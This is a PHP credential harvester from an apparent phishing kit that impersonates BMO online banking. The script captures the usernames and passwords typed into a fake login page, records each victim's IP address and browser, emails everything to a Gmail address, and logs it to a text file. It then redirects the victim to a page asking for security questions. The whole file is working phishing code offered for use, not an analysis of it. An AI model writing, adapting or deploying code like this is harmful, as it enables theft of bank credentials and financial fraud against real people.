<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LoginDetails-------------------\n";
$message .= "username : ".$_POST['username']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "-----------------created by medpage---------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------BMO Results----------------------\n";
$send = "flashygordon6754@gmail.com";
$subject = "bmoResultz 1 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "secquestions.php?product=7";

</script>